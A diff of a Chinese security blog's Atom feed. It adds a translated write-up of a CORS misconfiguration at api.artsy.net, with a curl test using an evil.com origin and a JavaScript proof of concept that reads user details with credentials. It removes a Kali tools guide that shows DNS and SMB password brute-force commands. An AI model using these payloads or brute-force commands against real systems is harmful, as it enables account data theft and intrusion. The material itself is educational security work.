@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://TimeS0ng.github.io/"/>
-  <updated>2018-12-23T10:10:52.736Z</updated>
+  <updated>2018-12-23T10:34:15.680Z</updated>
   <id>http://TimeS0ng.github.io/</id>
   
   <author>
@@ -14,6 +14,37 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>第十篇翻译：CORS跨域请求</title>
+    <link href="http://TimeS0ng.github.io/2018/12/23/%E7%AC%AC%E5%8D%81%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9ACORS%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82/"/>
+    <id>http://TimeS0ng.github.io/2018/12/23/第十篇翻译：CORS跨域请求/</id>
+    <published>2018-12-23T10:33:56.000Z</published>
+    <updated>2018-12-23T10:34:15.680Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="原文：Exploiting-Insecure-Cross-Origin-Resource-Sharing-CORS-api-artsy-net"><a href="#原文：Exploiting-Insecure-Cross-Origin-Resource-Sharing-CORS-api-artsy-net" class="headerlink" title="原文：Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net"></a>原文：<a href="https://blog.securitybreached.org/2017/10/10/exploiting-insecure-cross-origin-resource-sharing-cors-api-artsy-net/" target="_blank" rel="external">Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net</a></h4><h4 id="漏洞："><a href="#漏洞：" class="headerlink" title="漏洞："></a>漏洞：</h4><h4 id="作者：Muhammad-Khizer-Javed"><a href="#作者：Muhammad-Khizer-Javed" class="headerlink" title="作者：Muhammad Khizer Javed"></a>作者：<a href="https://blog.securitybreached.org/author/babayaga47/" target="_blank" rel="external">Muhammad Khizer Javed</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
+<h4 id="emsp-emsp-大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测"><a href="#emsp-emsp-大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测" class="headerlink" title="&emsp;&emsp;大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测"></a>&emsp;&emsp;大家好！几个月来我测试了许多不同站点的CORS（跨域资源共享）问题，以便我能更实际的了解它。如果想要测试一个站点是否存在CORS漏洞，我们先用curl来检测</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl https://api.artsy.net -H &quot;Origin: https://evil.com&quot; -I</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_10/1.png" alt=""></p>
+<h4 id="emsp-正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞"><a href="#emsp-正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞" class="headerlink" title="&emsp;正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞"></a>&emsp;正如您所见，Curl请求的响应包括如下所示，这意味着该站点存在CORS漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Access-Control-Allow-Credentials: true</div><div class="line">Access-Control-Allow-Origin: https://evil.com</div></pre></td></tr></table></figure>
+<h4 id="emsp-emsp-现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点"><a href="#emsp-emsp-现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点" class="headerlink" title="&emsp;&emsp;现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点"></a>&emsp;&emsp;现在需要做的就是找一个能获取用户信息的API接口，然后构建我们的EXP站点</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://api.artsy.net/api/user_details/user</div></pre></td></tr></table></figure>
+<p>[*]payload代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">function cors() &#123;</div><div class="line">var xhttp = new XMLHttpRequest();</div><div class="line">xhttp.onreadystatechange = function() &#123;</div><div class="line">if (this.readyState == 4 &amp;&amp; this.status == 200) &#123;</div><div class="line">document.getElementById(“demo”).innerHTML =</div><div class="line">alert(this.responseText);</div><div class="line">&#125;</div><div class="line">&#125;;</div><div class="line">xhttp.open(“GET”, “https://api.artsy.net/api/user_details/&lt;User-ID&gt;”, true);</div><div class="line">xhttp.withCredentials = true;</div><div class="line">xhttp.send();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_10/3.png" alt=""></p>
+<h2 id="视屏"><a href="#视屏" class="headerlink" title="视屏"></a>视屏</h2><video id="video" controls preload="none" poster="http://img5.imgtn.bdimg.com/it/u=750248180,3726006403&fm=26&gp=0.jpg"><br><source id="mp4" src="http://img.027cgb.com/612577/times0ng_blog/translate_10/CORS.mp4" type="video/mp4"><br></video>
+
+
+
+<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://tie.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;原文：Exploiting-Insecure-Cross-Origin-Resource-Sharing-CORS-api-artsy-net&quot;&gt;&lt;a href=&quot;#原文：Exploiting-Insecure-Cross-Origin-Resource-Sharing-CORS-api-artsy-net&quot; class=&quot;headerlink&quot; title=&quot;原文：Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net&quot;&gt;&lt;/a&gt;原文：&lt;a href=&quot;https://blog.securitybreached.org/2017/10/10/exploiting-insecure-cross-origin-resource-sharing-cors-api-artsy-net/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Exploiting Insecure Cross Origin Resource Sharing ( CORS ) | api.artsy.net&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;漏洞：&quot;&gt;&lt;a href=&quot;#漏洞：&quot; class=&quot;headerlink&quot; title=&quot;漏洞：&quot;&gt;&lt;/a&gt;漏洞：&lt;/h4&gt;&lt;h4 id=&quot;作者：Muhammad-Khizer-Javed&quot;&gt;&lt;a href=&quot;#作者：Muhammad-Khizer-Javed&quot; class=&quot;headerlink&quot; title=&quot;作者：Muhammad Khizer Javed&quot;&gt;&lt;/a&gt;作者：&lt;a href=&quot;https://blog.securitybreached.org/author/babayaga47/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Muhammad Khizer Javed&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;难度：低&quot;&gt;&lt;a href=&quot;#难度：低&quot; class=&quot;headerlink&quot; title=&quot;难度：低&quot;&gt;&lt;/a&gt;难度：低&lt;/h4&gt;
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>第九篇翻译：CORS跨域请求</title>
@@ -783,57 +814,6 @@
     <summary type="html">
     
       &lt;h2 id=&quot;0x00-序言&quot;&gt;&lt;a href=&quot;#0x00-序言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 序言&quot;&gt;&lt;/a&gt;0x00. 序言&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali-系列文章可能就要夭折了-o&quot;&gt;&lt;a href=&quot;#emsp-emsp-每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali-系列文章可能就要夭折了-o&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali 系列文章可能就要夭折了 \^o^&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;每次写文章我就最喜欢写这部分内容，反正瞎逼逼又不犯法对吧！本来昨天就该开始筹备这篇文章的，但世事难料，居然一时被天涯明月刀迷住了，幸好只是一时兴起及早退坑，不然kali 系列文章可能就要夭折了 \^o^&lt;/h4&gt;
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>kali使用入坑指南（二）</title>
-    <link href="http://TimeS0ng.github.io/2018/03/08/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
-    <id>http://TimeS0ng.github.io/2018/03/08/kali使用入坑指南（二）/</id>
-    <published>2018-03-08T15:19:13.000Z</published>
-    <updated>2018-12-18T15:27:14.483Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-决定以后每篇入坑指南都会写满十个以上kali-中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali-、入坑kali-的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。"><a href="#emsp-emsp-决定以后每篇入坑指南都会写满十个以上kali-中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali-、入坑kali-的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。" class="headerlink" title="&emsp;&emsp;决定以后每篇入坑指南都会写满十个以上kali 中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali 、入坑kali 的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。"></a>&emsp;&emsp;决定以后每篇入坑指南都会写满十个以上kali 中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali 、入坑kali 的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。</h4><a id="more"></a>
-<h2 id="0x01-DNS-爆破工具–fierce"><a href="#0x01-DNS-爆破工具–fierce" class="headerlink" title="0x01. DNS 爆破工具–fierce"></a>0x01. DNS 爆破工具–fierce</h2><blockquote>
-<p>fierce 专用于爆破 DNS 域名，就像它的名字一样纯粹，平时msf 用的多了也喜欢用点简单小巧又功能实用的工具。在渗透测试时，偶尔会碰到某些域名的主站被做成了全静态页面，神仙也难渗透。此时从旁站渗透是必然的选择，这时候就需要用到 fierce 爆破二级域名对旁站下黑手了。再给大家推荐一篇<a href="http://cms.pengyueisos.com/wp/2017/12/一次web渗透测试的经历与分析（上）【鹏越·学霸专/" target="_blank" rel="external">渗透旁站的文章</a></p>
-<p>爆破二级域名</p>
-<p>fierce -dns kali.org -threads 10</p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180308222717_PXjw12_Screenshot.jpeg" alt=""><br><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180308222753_JKcqYH_Screenshot.jpeg" alt=""></p>
-<h2 id="0x02-SMB-爆破工具–acccheck"><a href="#0x02-SMB-爆破工具–acccheck" class="headerlink" title="0x02. SMB 爆破工具–acccheck"></a>0x02. SMB 爆破工具–acccheck</h2><blockquote>
-<p>acccheck是用于探测远程目标主机是否开放smb服务,并尝试连接目标默认IPC$、ADMIN$共享,并通过字典文件尝试爆破 smb 服务的账号密码。有些工具比较简单，所以命令我就不一一介绍了，大家直接用 acccheck -h 就能查看具体的参数介绍。</p>
-<p>acccheck -t 192.168.122.140 -u times0ng -P /usr/share/wordlists/wfuzz/general/common.txt -v</p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180308225313_sPwpVJ_Screenshot.jpeg" alt=""></p>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180308225518_JesTGg_Screenshot.jpeg" alt=""></p>
-<h2 id="0x03-SNMP-信息枚举工具–-snmp-check"><a href="#0x03-SNMP-信息枚举工具–-snmp-check" class="headerlink" title="0x03. SNMP 信息枚举工具– snmp-check"></a>0x03. SNMP 信息枚举工具– snmp-check</h2><blockquote>
-<p>简单网络管理协议（SNMP）是TCP／IP协议簇的一个应用层协议，工作在UDP 161端口，用于监控目标设备的操作系统、硬件设备、服务应用、软硬件配置、网络协议状态、设备性能及资源利用率、设备报错事件信息、应用程序状态等软硬件信息。对于渗透测试者来说简直就是信息宝藏，一旦这个服务协议被利用，那么目标的大部分配置信息都会暴露无遗，对于企业来说这是致命的，而想要利用这个协议的弱点只需要服务器管理员缺乏安全意识做一些默认配置即可。</p>
-<p>这个工具并不支持对 public 的爆破，但如果使用 hydra 爆破public 之后再使用snmp-check 获取 SNMP 协议提供的海量信息的话简直是 perfect</p>
-<p>snmp-check 192.168.1.109 -c public -v 2c</p>
-</blockquote>
-<p><img src="http://note.youdao.com/yws/public/resource/911ea4f2fd7ee502e967a3c99fb7163b/xmlnote/1B20B5FDF95B4D3E8A2AA48AB71D9D46/3879" alt="image"></p>
-<h2 id="0x04-路由策略探测工具–Firewalk"><a href="#0x04-路由策略探测工具–Firewalk" class="headerlink" title="0x04. 路由策略探测工具–Firewalk"></a>0x04. 路由策略探测工具–Firewalk</h2><blockquote>
-<p>Firewalk 是一个主动侦察的网络安全工具，它试图判断出路由器或防火墙在第四层TCP/UDP  配置的策略规则，因此在内网中使用 Firewalk 将是我们最理想的选择。如果想了解 firewalk 的原理请 <a href="https://times0ng.github.io/2018/03/10/Firewalk-原理/">点击这里</a></p>
-<p>首先apt-get 安装firewalk，然后启动 firewalk 进行探察（ 参数都很简单，不懂的可以通过 man 手册自行查看 ）</p>
-<p>firewalk -S21,22,53,80,139,445 -i eth0 -n -pTCP 192.168.1.1 8.8.8.8</p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180310192754_kdeWFt_Screenshot.jpeg" alt=""></p>
-<h2 id="0x05-图形化sql自动注入工具—-jSQL"><a href="#0x05-图形化sql自动注入工具—-jSQL" class="headerlink" title="0x05. 图形化sql自动注入工具—-jSQL"></a>0x05. 图形化sql自动注入工具—-jSQL</h2><blockquote>
-<p>jSQL injection是一款基于JAVA开发的图形化 SQL 自动注入工具，包含数据库查询、后台爆破、文件读取、命令行、文件上传、目录爆破、编码转换等众多功能，既支持GET 型SQL 注入，也同时支持POST 型注入，还能定制header 头，是一款不可多得的好工具，很像kali 版御剑</p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180328215004_6eQEsq_Screenshot.jpeg" alt=""></p>
-<h2 id="0x06-WEB-漏洞扫描工具—-OWASP-ZAP"><a href="#0x06-WEB-漏洞扫描工具—-OWASP-ZAP" class="headerlink" title="0x06. WEB 漏洞扫描工具—-OWASP-ZAP"></a>0x06. WEB 漏洞扫描工具—-OWASP-ZAP</h2><blockquote>
-<p>最近自己利用 OWASP-ZAP 简单录制了一套web 渗透教程发到b 站了，大家有兴趣可以<a href="https://www.bilibili.com/video/av20890776/" target="_blank" rel="external">点这里</a>，基本用法我都提到过了，还简单讲了一些渗透环境的搭建和利用。</p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180328220834_N7Y5J3_Screenshot.jpeg" alt=""></p>
-<h2 id="0x07-“kali-下的菜刀”—-Altman"><a href="#0x07-“kali-下的菜刀”—-Altman" class="headerlink" title="0x07. “kali 下的菜刀”—-Altman"></a>0x07. “kali 下的菜刀”—-Altman</h2>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;0x00-序言&quot;&gt;&lt;a href=&quot;#0x00-序言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 序言&quot;&gt;&lt;/a&gt;0x00. 序言&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-决定以后每篇入坑指南都会写满十个以上kali-中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali-、入坑kali-的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。&quot;&gt;&lt;a href=&quot;#emsp-emsp-决定以后每篇入坑指南都会写满十个以上kali-中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali-、入坑kali-的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;决定以后每篇入坑指南都会写满十个以上kali 中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali 、入坑kali 的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;决定以后每篇入坑指南都会写满十个以上kali 中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali 、入坑kali 的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。&lt;/h4&gt;
     
     </summary>
     
